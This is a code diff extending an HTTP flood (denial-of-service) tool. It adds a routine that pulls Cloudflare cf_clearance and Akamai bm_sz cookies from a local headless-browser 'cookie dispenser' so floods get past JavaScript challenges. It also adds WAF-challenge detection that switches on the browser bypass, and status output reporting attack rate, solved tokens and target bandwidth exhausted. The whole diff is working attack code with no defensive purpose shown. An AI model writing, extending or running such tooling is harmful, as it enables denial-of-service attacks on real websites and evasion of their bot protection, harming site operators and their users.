@@ -1289,6 +1289,30 @@ class AsyncHttpFlood(Thread):
         # Fallback to system-wide success expectation
         return m["success"] / max(m["total"], 1)
         
+    def _chaos_poll_js_engine(self):
+        """Poll the local headless browser engine (Turnstile Dispenser) for fresh clearance cookies.
+        This allows the Python fast-execution engine to use real browser tokens just solved by Playwright."""
+        intel = self._chaos_intel
+        if not HAS_PLAYWRIGHT or not intel.get("playwright_active"):
+            return None
+            
+        try:
+            import urllib.request
+            req = urllib.request.Request(f"http://127.0.0.1:{intel['cookie_dispenser_port']}/get_token")
+            with urllib.request.urlopen(req, timeout=1) as resp:
+                data = json.loads(resp.read().decode('utf-8'))
+                if data.get("status") == "success" and data.get("cookie"):
+                    cookie_val = data["cookie"]
+                    # Map it so STEALTH_JA3 uses it
+                    cookie_name = "cf_clearance" if intel["waf_type"] == "cloudflare" else "bm_sz"
+                    intel["harvested_cookies"][cookie_name] = cookie_val
+                    intel["js_challenges_passed"] += 1
+                    return cookie_val
+        except Exception:
+            # Dispenser might be busy or offline
+            pass
+        return None
+
     def _chaos_track_bandwidth(self, method, success):
         """Calculate the estimated network bandwidth and CPU cycles wasted on the target server."""
         intel = self._chaos_intel
@@ -2826,6 +2850,10 @@ class HttpFlood(Thread):
         "q_discount_factor": 0.9, # Gamma: Importance of future rewards
         "q_epsilon": 0.4,         # Epsilon: Exploration rate (decays over time)
         "current_state": "PROBE", # Simplified state for RL tracking
+        "playwright_active": False, # Is our headless browser JS-engine active?
+        "js_challenges_passed": 0,  # Count of Cloudflare JS challenges solved
+        "browser_pool": [],       # Pool of real headless browser sessions passing tokens
+        "cookie_dispenser_port": 5005, # Port for the local turnstile/cookie dispenser API
     }
     
     # ========================================================================
@@ -3906,6 +3934,14 @@ class HttpFlood(Thread):
             rules = [d["rule"] for d in detected]
             intel["waf_rules_triggered"] = rules
             
+            # WAF Anomaly & Browser Engine interaction
+            if "js_challenge" in rules:
+                intel["anomaly_score"] = min(intel.get("anomaly_score", 0) + 10, 100)
+                if HAS_PLAYWRIGHT and not intel.get("playwright_active"):
+                    intel["playwright_active"] = True
+                    if int(REQUESTS_SENT) > 0 and int(REQUESTS_SENT) < 2000:
+                        print(f"{bcolors.WARNING}[CHAOS WAF] JS Challenge detected! Activating Headless Browser Engine to bypass...{bcolors.RESET}")
+            
             # Auto-correct WAF type if recon missed it
             primary_waf = detected[0]["waf"]
             if intel.get("waf_type") == "none" and primary_waf != "generic":
@@ -4984,6 +5020,10 @@ class HttpFlood(Thread):
         if intel["total_executions"] == 3 and not intel.get("briefing_shown"):
             self._chaos_battle_briefing()
             
+        # Phase 1.11.5: BROWSER JS ENGINE POLL (Retrieve fresh tokens from headless browsers)
+        if intel["total_executions"] % 10 == 0:
+            self._chaos_poll_js_engine()
+            
         # Phase 1.12: PROXY SELF-HEALING (monitor pool health)
         self._chaos_self_heal_proxies()
         
@@ -5282,7 +5322,11 @@ class HttpFlood(Thread):
                 print(f"  Bandwidth   : {bcolors.OKCYAN}{bw_str}{bcolors.RESET} of target data traffic exhausted")
                 q_size = sum(len(actions) for actions in intel.get("q_table", {}).values())
                 eps = intel.get("q_epsilon", 0.4) * 100
+                js_status = "ACTIVE" if intel.get("playwright_active") else "STANDBY"
+                js_passed = intel.get("js_challenges_passed", 0)
                 print(f"  ML Predictor: {ml_status} | RL Q-Table States: {q_size} (Exploration: {eps:.1f}%)")
+                if intel.get("playwright_active") or js_passed > 0:
+                    print(f"  JS Engine   : {bcolors.OKGREEN}{js_status}{bcolors.RESET} | Solved Tokens: {js_passed}")
                 print(f"  Attack Rate : {intel.get('adaptive_rpc', 10)} RPC | Jitter: {intel.get('jitter_ms', 0)}ms")
                 # Show WAF rules detected
                 rules = intel.get("waf_rules_triggered", [])
